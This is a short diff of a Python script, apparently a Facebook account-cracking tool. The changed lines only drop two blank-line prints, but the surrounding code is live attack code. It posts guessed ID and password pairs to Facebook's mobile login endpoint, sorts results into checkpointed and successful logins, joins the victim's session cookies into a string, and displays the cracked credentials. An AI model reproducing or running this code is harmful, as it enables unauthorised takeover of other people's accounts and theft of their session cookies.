@@ -1458,7 +1458,6 @@ def reguler(idf,pwv,awal):
 			po = ses.post('https://mbasic.facebook.com/login/device-based/regular/login/?refsrc=deprecated&lwv=100&ref=dbl',data=data,headers=headers,allow_redirects=False)
 			if "checkpoint" in ses.cookies.get_dict().keys():
 				cp+=1
-				print('\n')
 				tree = Tree(Panel.fit(f"""{K2}{idf}|{pw}{P2}""",style=f"{color_panel}"),guide_style="bold grey100")
 				tree.add(Panel.fit(f"{K2}{cektahun(idf)}{P2}",style=f"{color_panel}",guide_style="bold grey100"))
 				tree.add(Panel(f"{K2}{ua}{P2}",style=f"{color_panel}"))
@@ -1470,7 +1469,6 @@ def reguler(idf,pwv,awal):
 				break
 			elif "c_user" in ses.cookies.get_dict().keys():
 				ok+=1
-				print('\n')
 				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
 				tree = Tree(Panel.fit(f"""{H2}{idf}|{pw}{P2}""",style=f"{color_panel}"),guide_style="bold grey100")
 				tree.add(Panel(f"{H2}{cektahun(idf)}{P2}",style=f"{color_panel}",guide_style="bold grey100"))
